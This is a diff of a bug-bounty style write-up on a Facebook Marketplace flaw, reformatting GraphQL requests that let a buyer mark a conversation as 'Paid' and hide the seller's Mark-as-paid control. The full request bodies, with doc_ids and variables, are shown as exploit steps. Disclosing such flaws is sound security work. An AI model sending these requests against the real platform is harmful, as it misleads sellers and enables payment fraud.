@@ -27,11 +27,10 @@ The result misleads the seller (UI shows the order as *Paid* and hides the Mark 
 5. Using the **Graph API Explorer** (or any HTTP client), **UserB** sends a **POST** to GraphQL with the following parameters:
 
 ### 📤 Request (Original)
-```
+```http
 POST https://graph.facebook.com/graphql
 
-doc_id=5583150721696906
-variables={"input": {"client_mutation_id": "1","actor_id": "1","is_mark_as_paid": true,"message_thread_id": "{ID_MESSAGE}","should_update_thread_label": false,"surface": "MESSENGER_LIGHTSPEED_BANNER"}}
+&doc_id=5583150721696906&variables={"input": {"client_mutation_id": "1","actor_id": "1","is_mark_as_paid": true,"message_thread_id": "{ID_MESSAGE}","should_update_thread_label": false,"surface": "MESSENGER_LIGHTSPEED_BANNER"}}
 ```
 
 ### ✅ Response
@@ -56,37 +55,14 @@ During re‑testing, another GraphQL flow still allowed the buyer to reach the *
 ```http
 POST https://graph.facebook.com/graphql
 
-doc_id=4299671400131216
-variables={
-  "cappedScale": 2,
-  "id": "{ID_MARKETPLACE_ID}",
-  "MarketplaceProductImage_LARGE_SIZE": 189,
-  "MarketplaceProductImage_SMALL_SIZE": 137,
-  "MarketplaceProductItemMessageThread_STICKER_SIZE": 39,
-  "showCombinedInbox": false,
-  "showInboxTaggingRedesign": true,
-  "useUnifiedInboxStyle": true,
-  "shouldUseServerManagementActionsForAATest": false,
-  "shouldUseNewInventoryActionSheet": false,
-  "filterLabels": [],
-  "scale": 2.625
-}
+&doc_id=4299671400131216&variables={"cappedScale": 2,"id": "{ID_MARKETPLACE_ID}","MarketplaceProductImage_LARGE_SIZE": 189,"MarketplaceProductImage_SMALL_SIZE": 137,"MarketplaceProductItemMessageThread_STICKER_SIZE": 39,"showCombinedInbox": false,"showInboxTaggingRedesign": true,"useUnifiedInboxStyle": true,"shouldUseServerManagementActionsForAATest": false,"shouldUseNewInventoryActionSheet": false,"filterLabels": [],"scale": 2.625}
 ```
 
 ### 2) Mark as Paid via alternative mutation
 ```http
 POST https://graph.facebook.com/graphql
 
-doc_id=3163078603755877
-variables={
-  "input": {
-    "client_mutation_id": "45",
-    "actor_id": "100032714031845",
-    "message_thread_graphql_ids": ["{ID_MessageThread}"],
-    "referral_surface": "unknown",
-    "surface": "mark_as_paid_multi_select_page"
-  }
-}
+&doc_id=3163078603755877&variables={"input": {"client_mutation_id": "45","actor_id": "100032714031845","message_thread_graphql_ids": ["{ID_MessageThread}"],"referral_surface": "unknown","surface": "mark_as_paid_multi_select_page"}}
 ```
 
 **Observed:** The seller’s **Mark as paid** control disappears and the conversation shows **Paid** in UI; the buyer cannot revert it, leaving the seller with a misleading state.
